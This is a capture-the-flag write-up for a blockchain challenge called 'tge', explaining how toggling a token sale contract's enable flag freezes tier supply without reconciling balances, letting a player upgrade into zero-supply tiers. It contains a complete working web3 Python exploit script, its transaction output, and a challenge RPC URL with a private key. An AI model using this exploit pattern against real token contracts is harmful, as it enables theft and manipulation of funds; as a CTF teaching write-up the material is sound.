# C2C CTF - blockchain - tge

We are given a token sale system consisting of:

- a `Setup` contract
- a `TGE` (Token Generation Event) contract
- an ERC20 token

Players buy into tiers and upgrade through the TGE. The goal is to reach the final tier and satisfy:

```
setup.isSolved() == true
```

The intended flow is:

1. buy Tier 1
2. upgrade to Tier 2
3. upgrade to Tier 3

Each tier upgrade is supposed to be limited by supply. The exploit comes from breaking the relationship between **tier supply** and **user balance**.

The TGE tracks tier ownership and global tier supply.

Conceptually:

```
tierSupply[tier]  → how many exist globally
tierBalance[user] → how many the user owns
```

Upgrading checks something like:

```
tierBalance[user] <= tierSupply[tier]
```

This assumes supply and balances stay synchronized. But they don’t.

The Setup contract can toggle the TGE:

```
enableTge(bool)
```

Disabling the TGE triggers an internal snapshot/lock of supply. Re-enabling resumes upgrades.

The bug:

> The snapshot locks global tier supply
> 
> 
> but does NOT reset or reconcile user balances
> 

So we can create a state where:

```
tierSupply[tier] = 0
tierBalance[user] = 1
```

This violates the invariant:

```
balance <= supply
```

But the upgrade logic only checks balance ownership — not that supply is sane.

To exploit this, we need to:

1. Own a Tier 1 token
2. Freeze supply so Tier 2/3 supply becomes 0
3. Keep our balance intact
4. Upgrade into impossible tiers
We upgrade into tiers that technically have **zero supply**.

We approve tokens:

```
token.approve(tge, 15);
```

Then buy:

```
tge.buy();
```

Now:

```
tier1Balance[player] = 1
tier1Supply = 1
```

Everything is normal.

We disable the TGE:

```
setup.enableTge(false);
```

This locks internal accounting.

Tier 2 and Tier 3 supply become:

```
tier2Supply = 0
tier3Supply = 0
```

But our Tier 1 balance still exists. Balances are not reconciled with the snapshot. This is the invariant break.

We re-enable the TGE:

```
setup.enableTge(true);
```

Now upgrades are allowed again. But the supply snapshot remains broken.

We have:

```
tier2Supply = 0
tier3Supply = 0
tier1Balance[player] = 1
```

The system is now internally inconsistent.

We upgrade:

```
tge.upgrade(2);
```

The contract sees:

```
player owns Tier 1 → allowed to upgrade
```

But Tier 2 supply is 0.

We now own:

```
tier2Balance[player] = 1
tier2Supply = 0
```

We created an impossible state.

We repeat:

```
tge.upgrade(3);
```

And reach the final tier.

The contract never re-validates that supply exists.

We end with Tier 3 ownership despite:

```
tier3Supply = 0
```

The system considers us ascended.

```
setup.isSolved() == true
```

Challenge solved.

```python
from web3 import Web3

# --- CONFIGURATION (Paste values from the NC command here) ---
RPC_URL = "http://challenges.1pc.tf:50452/47e3f65e-2998-49f2-85b5-0028bd2f4e7d"
PRIVATE_KEY = "8b52dd28ce5002d000967947ef9317bee1db392e9a43ca0a772f3a737e6530be"
SETUP_CONTRACT_ADDRESS = "0x2094F2fE61cA4Afd0ba37Fb8D53Cf6A804422B54"
# -----------------------------------------------------------

def solve():
    # 1. Connect to the blockchain
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("Failed to connect to RPC")
        return

    account = w3.eth.account.from_key(PRIVATE_KEY)
    player_address = account.address
    print(f"Player Address: {player_address}")

    # 2. Define Minimal ABIs (Interfaces)
    setup_abi = [
        {"inputs": [], "name": "tge", "outputs": [{"internalType": "contract TGE", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "token", "outputs": [{"internalType": "contract Token", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [{"internalType": "bool", "name": "_tge", "type": "bool"}], "name": "enableTge", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
    ]

    tge_abi = [
        {"inputs": [], "name": "buy", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "uint256", "name": "tier", "type": "uint256"}], "name": "upgrade", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
    ]

    token_abi = [
        {"inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "value", "type": "uint256"}], "name": "approve", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"}
    ]

    # 3. Instantiate Contracts
    setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=setup_abi)
    
    tge_address = setup_contract.functions.tge().call()
    token_address = setup_contract.functions.token().call()
    
    tge_contract = w3.eth.contract(address=tge_address, abi=tge_abi)
    token_contract = w3.eth.contract(address=token_address, abi=token_abi)
    
    print(f"TGE Address: {tge_address}")
    print(f"Token Address: {token_address}")

    # Helper function to send transactions
    def send_tx(func_call):
        tx = func_call.build_transaction({
            'from': player_address,
            'nonce': w3.eth.get_transaction_count(player_address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        return tx_hash.hex()

    # --- EXECUTE ATTACK ---

    print("\n[1] Approving TGE to spend 15 tokens...")
    print(f"Tx: {send_tx(token_contract.functions.approve(tge_address, 15))}")

    print("[2] Buying Tier 1...")
    print(f"Tx: {send_tx(tge_contract.functions.buy())}")

    print("[3] Disabling TGE to trigger snapshot (locks Tier 2/3 supply at 0)...")
    print(f"Tx: {send_tx(setup_contract.functions.enableTge(False))}")

    print("[4] Re-enabling TGE to allow upgrades...")
    print(f"Tx: {send_tx(setup_contract.functions.enableTge(True))}")

    print("[5] Upgrading to Tier 2 (0 supply vs 1 balance)...")
    print(f"Tx: {send_tx(tge_contract.functions.upgrade(2))}")

    print("[6] Upgrading to Tier 3...")
    print(f"Tx: {send_tx(tge_contract.functions.upgrade(3))}")

    # Check solution
    if setup_contract.functions.isSolved().call():
        print("\nSUCCESS: Challenge Solved! Go get your flag.")
    else:
        print("\nFAILURE: isSolved() returned False.")

if __name__ == "__main__":
    solve()
```

Output:

```python
Player Address: 0xF71e8693C354215B83dcF5A372429aaf3CA5BBd9
TGE Address: 0xDD47E649b0509Ec40CA03A58a8D324bB20418EC3
Token Address: 0xD01d22e74Ac5c0B52D3644De0b2999aC3670BEb3

[1] Approving TGE to spend 15 tokens...
Tx: 30ffbc9016e7222c4cc99006a5edffb990e087505017099f9ecbdfbfdf8ee9ac
[2] Buying Tier 1...
Tx: 99da2cf8ba892f008a7506b9154fe593e10c1494a2606a951840adc03c0bde4c
[3] Disabling TGE to trigger snapshot (locks Tier 2/3 supply at 0)...
Tx: 564cc61f8ad7801f0b60bdd69cd8e3587e9f6c1059df5b5ad2efe8c621c76ca7
[4] Re-enabling TGE to allow upgrades...
Tx: 59e52f5db579df534466d63f447fb395d914c38850dba7b6fbcc5b5d66c36543
[5] Upgrading to Tier 2 (0 supply vs 1 balance)...
Tx: 89efeadcfc3cd618594f01791fb07eaefb620e8f46b27705f39e33b382ab3144
[6] Upgrading to Tier 3...
Tx: 0f505bc4d00dbfaa5e07911ad64a296d1b10d5b94e91f8100bc2595604742750

SUCCESS: Challenge Solved! Go get your flag.
```
